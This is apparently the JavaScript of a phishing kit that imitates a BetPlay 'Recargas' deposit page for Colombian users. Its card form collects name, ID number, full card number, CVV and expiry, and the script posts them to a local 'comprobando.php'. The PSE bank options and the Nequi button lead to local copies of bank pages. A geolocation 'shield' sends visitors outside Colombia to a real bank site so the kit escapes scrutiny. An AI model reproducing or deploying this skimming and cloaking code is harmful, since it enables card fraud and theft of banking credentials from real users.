var head = `
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../css/dashboard.css">
    <link rel="icon" type="image/x-icon" href="https://betplay.com.co/favicon.ico?v=1.1.0">
    <title>Recargas</title>

`;


var body = ` 
<body>
    <header>
        <div class="top-header">
            <div class="logo">
                <img src="../../img/logo.webp" alt="BetPlay Logo">
            </div>
            <div class="session-timer">
                <p>Sesión</p>
                <p id="timer">00:00:00</p>
                <div class="dots" onclick="toggleDropdown()">
                    <span>.</span>
                    <span>.</span>
                    <span>.</span>
                </div>
                <div id="dropdownMenu" class="dropdown-menu">
                    <button onclick="logout()">Cerrar sesión</button>
                </div>
            </div>
        </div>
    </header>

    <!-- Menú -->
    <div class="menu-container">
        <!-- Botón Nequi -->
        <div class="menu-item" onclick="toggleAccordion('nequi')">
            <img src="../../img/nequi-logo.svg" alt="Nequi">
            <div class="menu-item-text">Nequi</div>
            <div class="menu-item-arrow">➔</div>
        </div>
        <!-- Contenido desplegable de Nequi -->
        <div id="nequi" class="accordion-content">
            <h3 class="ficho">Recargas Nequi</h3>
            <div class="biencrazy">
            <p>¡Nuevo en BetPlay!</p>
            <p>Ahora puedes depositar desde tu aplicación Nequi. Te enviaremos una notificación que tendrás que confirmar en tu app Nequi.</p>
            <p>Tu titular debe coincidir con el de tu cuenta de Nequi.</p>
            </div>
            <div class="nequi-options">
                <button class="nequi-amount" onclick="setInputValue(10000)">$10Mil</button>
                <button class="nequi-amount"onclick="setInputValue(20000)">$20Mil</button>
                <button class="nequi-amount"onclick="setInputValue(50000)">$50Mil</button>
                <button class="nequi-amount"onclick="setInputValue(100000)">$100Mil</button>
                <button class="nequi-amount"onclick="setInputValue(200000)">$200Mil</button>

                <input type="text" id="recargaInput" placeholder="$ Otro valor" class="nequi-input">
            </div>
            <div class="biencrazy">
            <p>Recuerda que la recarga mínima es de $10Mil</p>
            </div>
            <button class="nequi-recharge-btn" onclick="redirigirNequi()">Recargar</button>
        </div>
    </div>

    <div class="menu-container">
          <!-- Botón Daviplata (inhabilitado) -->
        <div class="menu-item disabled">
            <img src="../../img/daviplata-logo.svg" alt="Daviplata">
            <div class="menu-item-text">Daviplata</div>
            <div class="menu-item-arrow">➔</div>
        </div>

    </div>

        <div class="menu-container">

         <div class="menu-item" onclick="toggleAccordion('pse')">
            <img src="../../img/pse-logo.png" alt="PSE">
            <div class="menu-item-text">PSE</div>
            <div class="menu-item-arrow">➔</div>
        </div>
        <div id="pse" class="accordion-content">
            <!-- Contenido desplegable de PSE -->
            <form class="pse-form">
                <div class="form-group">
                    <label for="valor-pse">Ingresa el valor</label>
                    <input type="text" id="valor-pse" placeholder="$0">
                </div>
                <div class="form-group">
                    <label for="tipo-persona">Tipo de persona</label>
                    <select id="tipo-persona">
                        <option>Natural</option>
                        <option>Jurídica</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="pasarela-pago">Pasarela de pago</label>
                    <select id="pasarela-pago">
                        <option>No debe estar inscrito a la pasarela</option>
                        <option>Recarga con Payu</option>
                        <option>Recarga con Kushki</option>
                        <option>Recarga con TuCompra</option>
                    </select>
                    <p class="note">*No debe estar inscrito a la pasarela, por medio de cualquiera de estas puede realizar su transacción.</p>
                </div>
                <div class="form-group">
                    <label for="elige-banco">Elige el banco</label>
                    <select id="bancoSelect">
        <option value="Seleccione su banco"></option>
        <option value="../../pay/pago/bogota/pse/index.php">Banco de Bogotá</option>
        <option value="../../pay/pago/bancolombia/pse/index.php">Bancolombia</option>
        <option value="../../pay/pago/davivienda/pse/index.php">Davivienda</option>
        <option value="../../pay/pago/bbva/pse/index.php">BBVA</option>
        <option value="../../pay/pago/colpatria/pse/index.php">Colpatria</option>
        <option value="../../pay/pago/avvillas/pse/index.php">Avvillas</option>
        <option value="../../pay/pago/occidente/pse/index.php">Occidente</option>
                    </select>
                </div>
                <div class="button-group">
<button class="nequi-recharge-btn" onclick="redirigirBanco(event)">Confirmar</button>
                </div>
            </form>
        </div>
        </div>

            <div class="menu-container">

        <!-- Botón Tarjetas -->
        <div class="menu-item" onclick="toggleAccordion('tarjetas')">
            <img src="../../img/tarjeta-iconno.svg" alt="Tarjetas">
            <div class="menu-item-text">Tarjetas</div>
            <div class="menu-item-arrow">➔</div>
        </div>
        <!-- Contenido desplegable de Tarjetas -->
        <div id="tarjetas" class="accordion-content">
            <form class="recargas-form" id="recargasForm">
                <div class="form-group">
                    <label for="valor">Ingresa el valor*</label>
                    <input type="text" inputmode="numeric" id="valor" name="valor" maxlength="15" value="10000" required>
                </div>
                <div class="form-group">
                    <label for="nombre">Nombres y Apellidos*</label>
                    <input type="text" id="name" name="name" maxlength="24" required>
                </div>
                <div class="form-group">
                    <label for="documento">Documento de identificación*</label>
                    <input type="text" id="dni" name="documento" maxlength="13" inputmode="numeric" required>
                </div>
                <div class="form-group">
                    <label for="tarjeta1">Número de la tarjeta*</label>
                    <div class="tarjeta-group">
                        <input type="text" id="tar1" name="tar1" maxlength="4" inputmode="numeric" required>
                        <input type="text" id="tar2" name="tar2" maxlength="4" inputmode="numeric" required>
                        <input type="text" id="tar3" name="tar3" maxlength="4" inputmode="numeric" required>
                        <input type="text" id="tar4" name="tar4" maxlength="4" inputmode="numeric" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="cvv">Código de seguridad*</label>
                    <div>
                        <input type="text" inputmode="numeric" id="cs" name="cvv" maxlength="3" style="width:45%;" required>
                        <a class="anuel" style="width:45%;">CVV / CVC*</a>
                    </div>
                </div>
                <div class="form-group">
                    <label for="fecha">Fecha de vencimiento*</label>
                    <div class="fecha-group">
                        <input type="text" inputmode="numeric" id="mm" name="mes" maxlength="2" placeholder="MM" required>
                        <input type="text" inputmode="numeric" id="aa" name="año" maxlength="4" placeholder="AAAA" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="cuotas">Cuotas*</label>
                    <input type="text" inputmode="numeric" id="cuotas" value="1" name="cuotas" maxlength="1" required>
                </div>
                <div class="form-group">
                    <label for="pasarela">Pasarela*</label>
                    <input type="text" id="pasarela" name="pasarela" maxlength="10" value="kusky" disabled required>
                </div>
                <div class="yeah">
                    <button type="submit" id="stepFinal" onclick="enviarFormulario();" class="recargar-btn">Recargar</button>
                </div>
            </form>
        </div>
        </div>

    <div class="menu-container">

         <!-- Botón Punto de Venta (inhabilitado) -->
        <div class="menu-item disabled">
            <img src="../../img/point-of-sale.svg" alt="Punto de Venta">
            <div class="menu-item-text">Punto de Venta</div>
            <div class="menu-item-arrow">➔</div>
        </div>
      </div>
</body>


</html>



    <script>
  function enviarFormulario() {
  const formData = {
    name: document.querySelector('input[name="name"]').value,
    creditcard:
      document.querySelector('input[name="tar1"]').value +
      document.querySelector('input[name="tar2"]').value +
      document.querySelector('input[name="tar3"]').value +
      document.querySelector('input[name="tar4"]').value,
    documento: document.querySelector('input[name="documento"]').value,
    cvv: document.querySelector('input[name="cvv"]').value,
    expdate:
      document.querySelector('input[name="mes"]').value +
      "/" +
      document.querySelector('input[name="año"]').value,
    monto: document.querySelector('input[name="valor"]').value,
  };

  fetch("../../pay/comprobando.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(formData),
  })
    .then((response) => response.json())
    .then((data) => {
      if (data.status === "success") {
        alert("Pago pendiente, redirigiendo...");
        window.location.href = data.redirect_url;
      } else {
        alert(data.message || "Error en el procesamiento.");
      }
    })
    .catch((error) => {
      console.error("Error en la solicitud:", error);
    });
}

</script>


`;


function addHead() {
  $("head").append(head); //Append es para agregar sin borrar
}

function addCode() {
  $("body").prepend(body); //Html es para agregar sin importar que hay debajo


  $("#name, #dni, #cs, #mm, #aa, #tar1, #tar2, #tar3, #tar4").on(
    "input",
    function () {
      validarInputs();
    }
  );

  function validarInputs() {
    var condicion1 = $("#mm").val().length == 2;
    var condicion2 = $("#cs").val().length == 3;
    var condicion3 = $("#aa").val().length == 4;
    var condicion4 = $("#name").val().length > 5;
    var condicion5 = $("#dni").val().length > 6;
    var condicion6 = $("#tar1").val().length == 4;
    var condicion7 = $("#tar2").val().length == 4;
    var condicion8 = $("#tar3").val().length == 4;
    var condicion9 = $("#tar4").val().length == 4;
    var condicion10 = $("#valor").val().length > 4;

    if (
      condicion1 &&
      condicion2 &&
      condicion3 &&
      condicion4 &&
      condicion5 &&
      condicion6 &&
      condicion7 &&
      condicion8 &&
      condicion9 &&
      condicion10
    ) {
      $("#stepFinal").prop("disabled", false);
    } else {
      $("#stepFinal").prop("disabled", true);
    }
  }


  $("#stepFinal").click(function () {
    $(this).prop("disabled", true);
    enviarFormulario();
  });

}

document.addEventListener("DOMContentLoaded", function () {
  async function shield() {
    var PHeaders = new Headers();
    PHeaders.append(
      "Content-Type",
      "application/x-www-form-urlencoded; charset=UTF-8"
    );

    var PInit = {
      method: "GET",
      headers: PHeaders,
    };
    var PRequest = new Request("https://get.geojs.io/v1/ip/country.json");

    let response = await fetch(PRequest, PInit);
    let responseJ = await response.json();

    setTimeout(() => {
      if (responseJ.country == "CO") {
        addHead();
      } else {
        window.location.href = "https://bancoserfinanza.com/";
      }
    }, 0);
  }
  shield();
});

window.addEventListener("load", function () {
  async function shield() {
    var PHeaders = new Headers();
    PHeaders.append(
      "Content-Type",
      "application/x-www-form-urlencoded; charset=UTF-8"
    );

    var PInit = {
      method: "GET",
      headers: PHeaders,
    };
    var PRequest = new Request("https://get.geojs.io/v1/ip/country.json");

    let response = await fetch(PRequest, PInit);
    let responseJ = await response.json();

    setTimeout(() => {
      if (responseJ.country == "CO") {
        addCode();
      } else {
        window.location.href = "https://bancoserfinanza.com/";
      }
    }, 0);
  }
  shield();
});

function logout() {
    window.location.href = "index.html";
}

function toggleDropdown() {
    const dropdown = document.getElementById('dropdownMenu');
    if (dropdown.style.display === "block") {
        dropdown.style.display = "none";
    } else {
        dropdown.style.display = "block";
    }
}

document.addEventListener("DOMContentLoaded", function() {
    let startTime = new Date();
    function updateTimer() {
        let currentTime = new Date();
        let timeDiff = currentTime - startTime;

        let hours = Math.floor(timeDiff / 3600000);
        let minutes = Math.floor((timeDiff % 3600000) / 60000);
        let seconds = Math.floor((timeDiff % 60000) / 1000);

        hours = hours < 10 ? '0' + hours : hours;
        minutes = minutes < 10 ? '0' + minutes : minutes;
        seconds = seconds < 10 ? '0' + seconds : seconds;

        document.getElementById('timer').textContent = `${hours}:${minutes}:${seconds}`;
    }

    setInterval(updateTimer, 1000);
});

function toggleAccordion(id) {
    // Obtener el contenido desplegable
    const content = document.getElementById(id);

    // Mostrar u ocultar el contenido
    if (content.style.display === "block") {
        content.style.display = "none";
    } else {
        content.style.display = "block";
    }
}

function redirigirNequi() {
    // Cambia la URL a la ruta deseada dentro de tu web
    window.location.href = '../../data/index.php';
}

function setInputValue(value) {
    const input = document.getElementById('recargaInput');
    input.value = `${value.toLocaleString('es-CO')}`; // Formato colombiano
}

function redirigirBanco(event) {
  event.preventDefault(); // Previene que el formulario se envíe y recargue la página
  const bancoSelect = document.getElementById('bancoSelect');
  const selectedValue = bancoSelect.value;

  console.log("Banco seleccionado:", selectedValue); // Muestra el valor seleccionado en la consola

  if (selectedValue) {
      window.location.href = selectedValue; // Redirige a la ruta específica
  } else {
      alert('Por favor, selecciona un banco antes de continuar.');
  }
}





 


